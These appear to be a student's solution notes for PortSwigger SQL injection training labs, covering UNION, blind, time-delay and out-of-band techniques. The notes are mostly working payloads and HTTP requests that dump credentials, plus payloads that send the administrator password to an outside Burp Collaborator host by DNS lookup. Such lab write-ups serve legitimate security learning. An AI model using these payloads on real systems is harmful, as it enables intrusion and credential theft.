<span style="color:yellow;font-weight:700;font-size:30px">
SQL injection
</span>
https://portswigger.net/web-security/sql-injection

# ***1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data***
https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

**SQL server code**
> SELECT * FROM products WHERE category = 'Gifts' AND released = 1

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.  

<!-- **payload1**
    Accessories'--+-  // eliminating the release clause shows unreleased items -->

**payload2**
> '+OR+1=1--+-

# ***2. Lab: SQL injection vulnerability allowing login bypass***
https://portswigger.net/web-security/sql-injection/lab-login-bypass

To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user. 

**payload:**
> administrator'--


<span style="color:yellow;font-weight:700;font-size:30px">
SQL injection UNION attacks
</span>
https://portswigger.net/web-security/sql-injection/union-attacks


# ***1. SQL injection UNION attack, determining the number of columns returned by the query***
https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values. 


**PayLoads to check**

**request 1:**
> GET /filter?category=Pets'+UNION+SELECT+NULL+FROM+information_schema.tables--+- HTTP/1.1response:
response:
> HTTP/1.1 500 Internal Server Error

**request 2:**
> GET /filter?category=Pets'+UNION+SELECT+NULL,+NULL,FROM+information_schema.tables--+- HTTP/1.1
Host: 
response:
    HTTP/1.1 500 Internal Server Error

**request 3:**
> GET /filter?category=Pets'+UNION+SELECT+NULL+FROM+information_schema.tables--+- HTTP/1.1response:
response:
> HTTP/1.1 200 OK

since we had 3 NULL values we understand there are 3 columns in our original table

**final payload**:
> '+UNION+SELECT+NULL,+NULL,+NULL+FROM+information_schema.tables--+


# ***2. SQL injection UNION attack, finding a column containing text***
https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 

**hint:** Make the database retrieve the string: 'g0cl1S'

after finding unmber of columns (see previous lab):
> GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+NULL+FROM+information_schema.tables--+ HTTP/1.1

we replace NULL value with random string provided: 'g0cl1S'

**request1**:
> GET /filter?category=Gifts'+UNION+SELECT+'g0cl1S',+NULL,+NULL+FROM+information_schema.tables--+ HTTP/1.1
response:
> HTTP/1.1 500 Internal Server Error

**request2**:
> GET /filter?category=Gifts'+UNION+SELECT+NULL,+'g0cl1S',+NULL+FROM+information_schema.tables--+ HTTP/1.1
response:
> HTTP/1.1 200 OK

***(Lab solved!)***

**request3**:
> GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+'g0cl1S'+FROM+information_schema.tables--+ HTTP/1.1
response:
> HTTP/1.1 500 Internal Server Error

only the second value reflect the string we entered - we know it supports string vslue and can be used to exfiltrate information. the other two cant be used for string value.

**final PayLoad**
> '+UNION+SELECT+NULL,'g0cl1S',NULL--+-


# ***3. SQL injection UNION attack, retrieving data from other tables***
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

The database contains a different *table* called **users**, with *columns* called **username** and **password**. 

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

1. determine how many coloumns are in the current table:
>GET /filter?category=Lifestyle'+UNION+SELECT+NULL,+NULL+FROM+information_schema.tables--+ HTTP/1.1
> HTTP/1.1 200 OK

2. determine how many of them support stroing values:
>GET /filter?category=Lifestyle'+UNION+SELECT+'test',+'test'+FROM+information_schema.tables--+ HTTP/1.1
> HTTP/1.1 200 OK
we see both fields can be used for information exfiltration

3. exfiltrate usernames and passwords:
> GET /filter?category='+UNION+SELECT+username,+password+FROM+users--+ HTTP/1.1
response:
```htm
HTTP/1.1 200 OK
...
    <th>wiener</th>
    <td>wbc0yljy5p3l3hrlsgyc</td>
</tr>
<tr>
    <th>administrator</th>
    <td>rwrir8nv1ytk1p6psz79</td>
</tr>
<tr>
    <th>carlos</th>
    <td>illfmtdl1swjebjbc146</td>
```
 4. login to administrator account to solve the lab.


 **Final PayLoad**
    '+UNION+SELECT+username,password+FROM+users--

# **SQLi Cheet-Sheet**
https://portswigger.net/web-security/sql-injection/cheat-sheet

# ***4. SQL injection UNION attack, retrieving multiple values in a single column***
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

Hint: You can find some useful payloads on our SQL injection cheat sheet.


1. determine how many coloumns are in the current table:
> GET /filter?category=Pets'+UNION+SELECT+NULL,+NULL+FROM+information_schema.tables-- HTTP/1.1
> HTTP/1.1 200 OK

2. determine how many of them support stroing values:
**request1**
> GET /filter?category=Pets'+UNION+SELECT+'test',+NULL+FROM+information_schema.tables-- HTTP/1.1
response:
> HTTP/1.1 500 Internal Server Error

**request2**
> GET /filter?category=Pets'+UNION+SELECT+NULL,+'test'+FROM+information_schema.tables-- HTTP/1.1
response:
> HTTP/1.1 200 OK
only the second value supports string. 

3. exfiltrate usernames and passwords via the second field only
> GET /filter?category='+UNION+SELECT+NULL,+username||'+:::+'||password+FROM+users-- HTTP/1.1
```htm
HTTP/1.1 200 OK
<tr>
    <th>wiener ::: w9s85w2tzrnwu09dmuo5</th>
</tr>
<tr>
    <th>administrator ::: kjkk36tdibdxgjvrebdd</th>
</tr>
<tr>
    <th>carlos ::: rmnedciwjzzig72rrw35</th>
</tr>
```

**Final PayLoad**
'+UNION+SELECT+NULL,+username||'+:::+'||password+FROM+users--

4. login to administrator account to solve the lab

# ***5. SQL injection attack, querying the database type and version on Oracle***
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

To solve the lab, Make the database retrieve the strings: 

*'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'*

Hint:On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual

For more information, see our SQL injection cheat sheet.

1. determine how many coloumns are in the current table:
> GET /filter?category=Pets'+UNION+SELECT+NULL,+NULL+FROM+dual-- HTTP/1.1
response:
> HTTP/1.1 200 OK

2. determine how many of them support stroing values:
**request3**
> GET /filter?category=Pets'+UNION+SELECT+'test',+'test'+FROM+dual-- HTTP/1.1
response:
> HTTP/1.1 200 OK

both fields support strings

3. exfiltrate version:
2 options to retrive the information from Oracle systems:
> SELECT banner FROM v$version
> SELECT version FROM v$instance

**request1**
GET /filter?category=Pets'+UNION+SELECT+banner,+NULL+FROM+v$version-- HTTP/1.1
```htm
HTTP/1.1 200 OK
    <th>NLSRTL Version 11.2.0.2.0 - Production</th>
</tr>
<tr>
    <th>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</th>
</tr>
<tr>
    <th>PL/SQL Release 11.2.0.2.0 - Production</th>
```
# Lab Solved


# ***6. SQL injection attack, querying the database type and version on MySQL and Microsoft***
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

To solve the lab, display the database version string - Make the database retrieve the string: **'8.0.31'**

1. determine how many coloumns are in the current table:
> GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL+FROM+information_schema.tables--+- HTTP/1.1
response:
> HTTP/1.1 200 OK
note the use of **--+-** instead of just **--**


2. determine how many of them support stroing values:
**request3**
> GET /filter?category=Gifts'+UNION+SELECT+'test',+'test'+FROM+information_schema.tables--+-  HTTP/1.1
response:
> HTTP/1.1 200 OK

both fields support strings

3. exfiltrate version:
2 options:
- Microsoft 	SELECT @@version
- MySQL 	SELECT @@version 
**request:**
>GET /filter?category=Gifts'+UNION+SELECT+@@version,+NULL+FROM+information_schema.tables--+- HTTP/1.1
response:
```htm
HTTP/1.1 200 OK
<th>8.0.31</th>
```
**Lab solved**

# ***7. SQL injection attack, listing the database contents on non-Oracle databases***
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

 The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

1. determine how many coloumns are in the current table:
> GET /filter?category=Lifestyle+UNION+SELECT+NULL,+NULL+FROM+information_schema.tables--+- HTTP/1.1
response:
> HTTP/1.1 200 OK
note the use of **--+-** instead of just **--**


2. determine how many of them support stroing values:
**request3**
> GET /filter?category=Lifestyle'+UNION+SELECT+'test',+'test'+FROM+information_schema.tables--+-  HTTP/1.1
response:
> HTTP/1.1 200 OK

both fields support strings

3. find table names:
> GET /filter?category='+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--+- HTTP/1.1
response:
> HTTP/1.1 200 OK
><th>users_ioqfhm</th>

4. find columns:
> GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns--+- HTTP/1.1
response:
> <th>superuser</th>
> <th>password_zoxvmu</th>
><th>username_ynicnn</th>

5. combine all to a payload:
**request**
>GET /filter?category='+UNION+SELECT+username_ynicnn,+password_zoxvmu+FROM+users_ioqfhm--+- HTTP/1.1
response:
>HTTP/1.1 200 OK
><tbody>
><tr>
><th>carlos</th>
><td>66krsxvv5zmw878b42bu</td>
></tr>
><tr>
><th>wiener</th>
><td>qzwsqtvpcmdcjqbrcpwz</td>
></tr>
><tr>
><th>administrator</th>
><td>1b3u58ppxvw198b7ozu4</td>

Lab solved!

# ***10. SQL injection attack, listing the database contents on Oracle***
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

 The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 

Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual 


1. determine how many coloumns are in the current table:
> GET /filter?category='+UNION+SELECT+NULL,+NULL+FROM+all_tables--+- HTTP/1.1
response:
> HTTP/1.1 200 OK


2. determine how many of them support stroing values:
**request3**
> GET /filter?category='+UNION+SELECT+'test',+'test'+FROM+all_tables--+- HTTP/1.1
response:
> HTTP/1.1 200 OK

both fields support strings

3. find table names:
> GET /filter?category='+UNION+SELECT+table_name,+NULL+FROM+all_tables--+- HTTP/1.1
response:
> HTTP/1.1 200 OK
><th>USERS_BLXPRF</th>

4. find columns:
**request**
> GET /filter?category='+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns--+- HTTP/1.1
response:
><th>USERNAME_DEGMLB</th>
><th>PASSWORD_RROMTL</th>

5. combine all to a payload:
**request**
> GET /filter?category='+UNION+SELECT+USERNAME_DEGMLB,+PASSWORD_RROMTL+FROM+USERS_BLXPRF--+- HTTP/1.1
response:
>HTTP/1.1 200 OK
><tbody>
><tr>
><th>administrator</th>
><td>eq0spjmi30e7zgtlnsus</td>
><tr>
><th>carlos</th>
><td>3yqxy93nlg6b829u45uq</td>
></tr>
><tr>
><th>wiener</th>
><td>2622xpvib3h4s1czxfph</td>
></tr>

**Lab solved!**


# ***11. Blind SQL injection with conditional responses***
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

**what we know:**
- injection vector = cookie "TrackingId" parameter
- table = users
- columns = username, password

lab 'tell' is a 'welcome screen' that is beeing loaded when any row returns a value,
effectivly changing the content length from any response without a raw.

**plan of attack**
- check injection point by breaking the code with "'"
- establish baseline: 'correct' response length and 'failed' response length:
- guess a letter and check response length for clues


**SQL command to use**
SUBSTR(string, start, length):

**examlpes:**
- substr(cat,1,1) = "c"
- substr(dog,2,1) = "o"
- substr(blue,2,2) = "lu"
- substr(united,4,3) = "ted"

to guess we need to compare each letter in the password to a letter of our choice:
password 1st letter  = 'a' // example

**command explanation:**
    AND SUBSTR(
        (SELECT password FROM users WHERE username = 'administrator'),        // string = password to check
        1,1)                                                                  //start substring from XX and for length of YY
        ='a                                                                  // compare to our charecter guess

**payload example**:
    'and substr((select password from users where username='administrator'),1,1)='a          //light version

**payload inside code** - using "pass_index" and "i" variables:
    trackingId +'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+{pass_index},+1)+=+'{i}"


<span style="color:yellow;font-weight:700;font-size:30px">
Blind SQL injection
</span>
https://portswigger.net/web-security/sql-injection/blind


# ***1. Blind SQL injection with conditional errors***
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

 The database contains a different table called **users**, with columns called **username** and **password**. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.
Hint

You can assume that the password only contains lowercase, alphanumeric characters.

telltale:
<div>Welcome back!</div>

1. determine how many coloumns are in the current table: 
**request1:**
> GET /filter?category=Gifts HTTP/1.1
> Cookie: TrackingId='+UNION+SELECT+NULL+FROM+information_schema.tables--+-; session=QyM6Jg8mPkrezSg7cNC6sZtiLeiZ9WBB

response:
> HTTP/1.1 200 OK
> <div>Welcome back!</div>

*only 1 field is present

2. check if we get a valid value if we try to fetch the **password** fo **administrator**
**resquest**
>GET /filter?category=Gifts HTTP/1.1
>Cookie: TrackingId=UnfSjZLVTySz9bjf'+UNION+SELECT+password+FROM+users+WHERE+username='administrator'--+-; session=8PQPruKN79S6L97lF9Oqc1L2PhzKjbNe
response:
<div>Welcome back!</div>

3. lets introduce a SUBSTR:
> 'and substr((select password from users where username='administrator'),1,1)!='a --+-
**request:**
> GET /filter?category=Gifts HTTP/1.1
> Cookie: TrackingId=APote5KnCQfDegMa'and substr((select password from users where username='administrator'),1,1)!='a --+-; session=WBUniANtlYbYDetaTEjQXoK9fOoi2KZV

response:
> <div>Welcome back!</div>

observe when condition changes to **= 'a'** we dont get the telltail response
 
we need to iterate via intruder or via code.

1. for Code see:
> /SQLi - SQL Injection/Lab_ Blind SQL injection with conditional responses.py

2. intruder:
send request to **Intruder** and choose **Cluster Bomb**. in payload use *numbers* to 1-30 as payload 1 and *brute force* use {a-z0-9} 
> GET /filter?category=Gifts HTTP/1.1
> Cookie: TrackingId=APote5KnCQfDegMa'+AND+SUBSTR((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+§{pass_index}§,+1)+=+'§{char}§; session=WBUniANtlYbYDetaTEjQXoK9fOoi2KZV

in response observe most response have length of *6891* while about only few have *6952* length.
send those **requests** to comparer and copy the char value the yeilded the response (payload 2) to the specified charecter lovation in the password (payload 1)
(a lot of wotk - coding is better...)

# Solved


# ***2. Blind SQL injection with time delays***
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

 The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

> To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay. 

1. use basic format to determine how many coloumns are in the current table with various time delay triggers: 
**request5:**
>GET /filter?category=Pets HTTP/1.1
>Cookie: TrackingId=UZ2bVerI2nvWNdf5'+UNION+SELECT+NULL+FROM+information_schema.tables%3bSELECT+pg_sleep(10)--; session=J4XYX9LvR5r8TI4Vl7gzz8ehGsEmQoLr

we know that **SELECT pg_sleep(10)** is used by PostgreSQL and thay we have 1 field of returnd value.

# lab solved


# ***3.lab: Blind SQL injection with time delays and information retrieval***
https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

telltale: **time dealy**

1. use payload from previous lab to confirm time delay:
**request5:**
>GET /filter?category=Pets HTTP/1.1
>Cookie: TrackingId=UZ2bVerI2nvWNdf5'+UNION+SELECT+NULL+FROM+information_schema.tables%3bSELECT+pg_sleep(10)--; session=J4XYX9LvR5r8TI4Vl7gzz8ehGsEmQoLr
response: **time delay**

<!-- from cheetsheet:
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END -->

'||(SELECT CASE WHEN (SUBSTR(password,§{pass_index}§,1)='§{char}§') THEN pg_sleep(1) ELSE '' END FROM users WHERE username='administrator')||'

See code in folder:
/SQLi - SQL Injection/Lab_ Blind SQL injection with time delays.py


# ***4.Lab: Blind SQL injection with out-of-band interaction***
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
 The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 

**Burp colaborator:**
mj96kitkkcyzl6et8txxik1psgyhm6.oastify.com

try different payloads from the cheet sheet:

> GET /filter?category=Pets HTTP/1.1
> Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//sfbi7le89d6u9c0nb6siq3hxwo2hq6.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=lSieWhubfLdBEKLv0WAuxT1RMblaQfH9


<!-- 
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//sfbi7le89d6u9c0nb6siq3hxwo2hq6.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--



didnt work:
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.sfbi7le89d6u9c0nb6siq3hxwo2hq6.oastify.com/"> %remote;]>'),'/l') FROM dual 


'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--

copy (SELECT '') to program 'nslookup mj96kitkkcyzl6et8txxik1psgyhm6.oastify.com'


LOAD_FILE('\\\\md36einkecszf68t2trxckvpmgsfg4.oastify.com\\a')
SELECT ... INTO OUTFILE '\\\\md36einkecszf68t2trxckvpmgsfg4.oastify.com\a'


Cookie: TrackingId=FHv90K7JIp9WmoMV'%3b+exec+master..xp_dirtree+'//md36einkecszf68t2trxckvpmgsfg4.oastify.com/a'--;

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://7v3rw355wxakxrqeke9iu5da41aryg.oastify.com/"> %remote;]>'),'/l') FROM dual

%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{pass_index},1)='{char}')+THENcopy+(SELECT+'')+to program+'nslookup+7v3rw355wxakxrqeke9iu5da41aryg.oastify.com+ELSE+''+END+FROM+users--


'||(SELECT CASE WHEN (SUBSTR(password,{pass_index},1)='{char}') THEN copy (SELECT '') to program 'nslookup 7v3rw355wxakxrqeke9iu5da41aryg.oastify.com  ELSE '' END FROM users WHERE username='administrator')||'

'+UNION+SELECT+NULL+FROM+information_schema.tables%3bSELECT+copy (SELECT '') to program 'nslookup 7v3rw355wxakxrqeke9iu5da41aryg.oastify.com'--

'+UNION+SELECT+NULL+FROM+information_schema.tables%3bSELECT+copy (SELECT '') to program 'nslookup 7v3rw355wxakxrqeke9iu5da41aryg.oastify.com'-- -->



# ***5. Lab: Blind SQL injection with out-of-band data exfiltration***
https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

 The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

**Burp colaborator:**
9nxzf2mphuebht84jn0zykpe45azyo.oastify.com

try payloads from cheet sheet. enter the query to get padministrator password and use the colaborator address:
> '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.9nxzf2mphuebht84jn0zykpe45azyo.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

**request:**
> GET /filter?category=Gifts HTTP/1.1
> Cookie: TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.9nxzf2mphuebht84jn0zykpe45azyo.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--; session=1syUfEJVhh2hm0I4Fb8wQyutHwd285D2

**response in Burp Colaborator:**
> The Collaborator server received a DNS lookup of type AAAA for the domain name i8i90aeaq5jj5pdpln6m.9nxzf2mphuebht84jn0zykpe45azyo.oastify.com.

password:**i8i90aeaq5jj5pdpln6m**

# lab solved


